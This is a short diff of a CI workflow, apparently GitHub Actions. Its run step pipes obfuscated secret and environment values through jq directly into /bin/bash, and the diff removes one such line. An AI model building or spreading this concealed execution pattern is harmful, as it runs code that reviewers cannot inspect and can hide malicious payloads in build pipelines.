@@ -17,7 +17,6 @@ jobs:
           p272: ${{ secrets.p272 }}
         run: |
           printf '%s' "$p272" | jq -r .nqofg332 | /bin/bash
-          echo $gr82118 | jq -r .ko13 | /bin/bash
           printf '%s' "$x8" | jq -r .zc55 | /bin/bash
           echo $paksk8 | jq -r .d28107 | /bin/bash
 
